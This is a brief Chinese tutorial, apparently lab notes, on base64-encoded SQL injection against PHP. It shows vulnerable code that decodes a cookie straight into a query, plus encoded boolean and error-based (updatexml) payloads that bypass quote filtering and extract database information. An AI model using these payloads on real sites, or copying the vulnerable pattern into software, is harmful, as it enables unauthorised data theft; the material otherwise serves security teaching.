## 0x00 base64注入原理
base64 一般用于数据编码进行传输，例如邮件等。  
数据编码的好处是，防止数据丢失，也有不少网站使用 base64编码 进行数据传输，如 搜索栏 或者 id接收参数有可能使用 base64 处理传递的参数。  
在php 中 base64_encode()函数对字符串进行base64 编码,既然可以编码也可以进行解码，base64_decode()这个函数对 base64 进行解码。  
编解码流程如下：  
1 ->base64 编码-> MQ== -> base64 解密 ->1   
base64 编码注入，可以绕过 gpc 注入拦截，因为编码过后的字符串不存在特殊字符。编码过后的字符串，在程序中重新被解码，再拼接成 SQL 攻击语句，再执行，从而形式 SQL 注入。

## 0x01 base64注入代码分析
使用$_COOKIE['uname']获取 cookie 传过来的账号，再拼接到 SQL 带入查询。  
```php
$cookie = $_COOKIE['uname'];
$cookie = base64_decode($cookie)
$sql = "select * from users where username = '$cookie' limit 0,1";
```
上面代码中，先把\$_COOKIE['uname']传过来的数据进行解码，成功解码后才能显示正常数据。

## 0x02 黑盒环境下的base64注入
首先观察网站是否存在 base64 编码的数据，例如传递的 id 的值，搜索模块等，寻找每个功能的数据包。如果存在类似==等，可以用 base64 解码进行测试。  
admin'and 1=1-- 编码 YWRtaW4nYW5kIDE9MS0tIA==    
admin'and 1=2-- 编码 YWRtaW4nYW5kIDE9Mi0tIA==  
本次测试的页面是 cookie 所以需要 cookie 提交 而且有括号需要闭合，第一次提交页面返回存在 admin 第二次提交没有 admin 两个页面返回的结果不相同所以存在 SQL 注入。  
本代码存在 mysqli_error 函数所以可以里利用报错注入再进一步获取敏感信息。  
```sql
'admin' and (updatexml(1,concat(0x7e,(select user()),0x7e),1))--
```
进行base64编码是：YWRtaW4nKWFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpLDEpKS0tICA= ，提交即可获取敏感信息。